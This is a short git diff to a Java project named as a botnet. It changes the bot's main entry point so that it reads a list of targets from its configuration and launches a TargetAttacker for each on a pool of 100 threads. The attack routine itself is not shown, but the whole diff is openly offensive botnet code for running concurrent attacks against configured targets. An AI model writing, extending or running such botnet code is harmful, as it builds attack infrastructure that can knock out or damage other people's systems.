@@ -28,6 +28,13 @@ package com.giammp.botnet;
 
 import com.giammp.botnet.config.BotConfigurator;
 import com.giammp.botnet.config.BotConfiguration;
+import com.giammp.botnet.control.TargetAttacker;
+import com.giammp.botnet.model.Target;
+
+import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes the bot entry-point.
@@ -49,6 +56,30 @@ public class BotMain {
 
     if (config.isDebug()) {
         System.out.println(config);
+    }
+
+    attackTargets(config.getTargets());
+  }
+
+  /**
+   * Schedules the attacks
+   * @param targets The list of targets to attack.
+   * @see Target
+   */
+  public static void attackTargets(List<Target> targets) {
+    ExecutorService executor = Executors.newFixedThreadPool(100);
+
+    for (Target tgt : targets) {
+      Runnable attacker = new TargetAttacker(tgt);
+      executor.execute(attacker);
+    }
+
+    executor.shutdown();
+
+    try {
+      executor.awaitTermination(60, TimeUnit.SECONDS);
+    } catch (InterruptedException e) {
+      e.printStackTrace();
     }
   }
 }
